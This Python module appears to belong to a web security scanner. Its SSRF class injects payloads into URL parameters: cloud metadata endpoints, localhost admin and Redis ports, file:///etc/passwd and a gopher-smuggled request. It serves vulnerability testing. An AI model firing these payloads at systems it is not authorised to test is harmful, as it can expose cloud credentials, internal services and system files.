#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.logger import log_info, log_success, log_warning, log_error, log_debug

class SSRFScanner:
    def __init__(self, target, verbose=False):
        self.target = target.rstrip('/')
        self.verbose = verbose
        self.vulnerable = []
        self.payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/",
            "http://169.254.169.254/latest/user-data/",
            "http://127.0.0.1:8080/admin",
            "http://localhost:8080/admin",
            "http://127.0.0.1:6379/",
            "file:///etc/passwd",
            "gopher://localhost:8080/_GET%20/admin%20HTTP/1.0%0A%0A"
        ]

    def extract_params(self):
        parsed = urlparse(self.target)
        if not parsed.query:
            return {}
        return parse_qs(parsed.query)

    def build_url(self, params):
        parsed = urlparse(self.target)
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def test_ssrf(self, param, payload):
        params = self.extract_params()
        if param in params:
            params[param] = [payload]
        else:
            params[param] = payload
        test_url = self.build_url(params)
        try:
            resp = requests.get(test_url, timeout=10, allow_redirects=False)
            if resp.status_code == 200 and len(resp.text) > 50:
                result = {
                    "param": param,
                    "payload": payload,
                    "url": test_url,
                    "status": resp.status_code,
                    "vulnerable": True
                }
                self.vulnerable.append(result)
                log_success(f"🔥 Potential SSRF found on {param} with payload: {payload}")
                return True
            elif self.verbose:
                log_debug(f"Param {param} with {payload} -> {resp.status_code}")
        except Exception as e:
            if self.verbose:
                log_debug(f"Error: {e}")
        return False

    def run(self):
        log_info(f"Starting SSRF scan on: {self.target}")
        params = self.extract_params()
        if not params:
            log_warning("No GET parameters found. SSRF scan works best with URL parameters like ?url=http://example.com")
            return {"target": self.target, "scan_type": "ssrf", "vulnerable": []}
        
        url_params = [p for p in params.keys() if 'url' in p.lower() or 'path' in p.lower() or 'dest' in p.lower() or 'redirect' in p.lower()]
        if not url_params:
            url_params = list(params.keys())
        
        for param in url_params[:5]:  # محدود کردن به ۵ پارامتر برای سرعت
            log_info(f"Testing parameter: {param}")
            for payload in self.payloads[:5]:  # محدود کردن پیلودها
                self.test_ssrf(param, payload)
        
        log_success(f"SSRF scan completed. Found {len(self.vulnerable)} potential vulnerabilities.")
        return {"target": self.target, "scan_type": "ssrf", "total": len(self.vulnerable), "vulnerable": self.vulnerable}
